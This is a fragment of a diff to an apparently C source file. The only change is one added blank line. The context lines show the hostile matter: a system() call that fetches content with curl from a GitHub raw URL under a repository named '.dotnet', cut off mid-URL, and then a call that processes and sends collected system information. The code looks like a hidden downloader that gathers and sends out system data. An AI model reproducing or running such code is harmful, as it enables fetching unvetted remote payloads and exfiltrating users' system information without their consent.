@@ -442,3 +442,4 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
   ProcessAndSendData((size_t **)SysInfo);
   return 0;
 }
+
